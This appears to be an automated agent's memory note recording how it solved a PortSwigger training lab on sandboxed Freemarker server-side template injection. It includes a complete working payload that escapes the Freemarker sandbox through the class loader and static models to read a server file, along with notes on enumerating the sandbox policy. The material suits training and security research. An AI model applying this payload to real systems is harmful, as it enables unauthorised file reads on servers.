---
metadata:
  node_type: memory
name: "PortSwigger SSTI sandboxed Freemarker A-arm solve"
description: "Sandboxed Freemarker SSTI lab solved via ProtectionDomain.getClassLoader -> ObjectWrapper.DEFAULT_WRAPPER static field -> getStaticModels -> Files.readString(Paths.get(...))"
last_updated: 2026-10-10T06:42:06+08:00
created: 2026-10-10T06:42:06+08:00
---

## 2026 run - lab-server-side-template-injection-in-a-sandboxed-environment (arm A)

Target: Freemarker product-template preview (`POST /product/template?productId=1`, fields csrf/template/template-action=preview) as content-manager; preview renders server-side, so the editor is also the oracle. Solve = read /home/carlos/my_password.txt, then `POST /submitSolution` field `answer`.

Sandbox surface measured empirically:
- `?new` works only for TemplateModel classes; resolver blacklists exactly FreeMarker SAFER_RESOLVER's three: `freemarker.template.utility.Execute`, `...ObjectConstructor`, `...JythonRuntime`. `?api` disabled (`api_builtin_enabled=false`).
- Member policy hides reflection effects on java.lang.Class / Method / Constructor: `getClassLoader`, `newInstance` (Class and Constructor), `Method.invoke`, `getResourceAsStream`, statics of the represented class. Template data model holds only `product`.
- Wide open instead: bean methods on ordinary objects, `Class.getProtectionDomain()`, `ProtectionDomain.getClassLoader()`, `ClassLoader.loadClass(String)`, `Class.getDeclared*`/`getFields`, `Field.get`, `BeansWrapper.getStaticModels()`.

Working payload (one preview request):
```
<#assign CL=product.getClass().getProtectionDomain().getClassLoader()>
<#assign OW=CL.loadClass('freemarker.template.ObjectWrapper')>
<#assign W=OW.getFields()?filter(f -> f.getName() == 'DEFAULT_WRAPPER')[0].get(null)>
<#assign ST=W.getStaticModels()>
${ST['java.nio.file.Files'].readString(ST['java.nio.file.Paths'].get('/home/carlos/my_password.txt'))}
```
Result: password read, `submitSolution` answered `{"correct":true}`, banner `is-solved`.

Lessons: statics reachable through the DefaultObjectWrapper static field wins over full reflection chains; enumerating the policy surface with per-probe `<#attempt>/<#recover>` beats one-payload guessing; varargs calls (`getDeclaredConstructor(Class)`, `Paths.get(String)`) pack fine.

Piece notes: `http_session` body_snippet is large enough to read preview output in-band; `page_read` widget-lab-id + `range_launch launch-url` launched first try, `reused:false`.

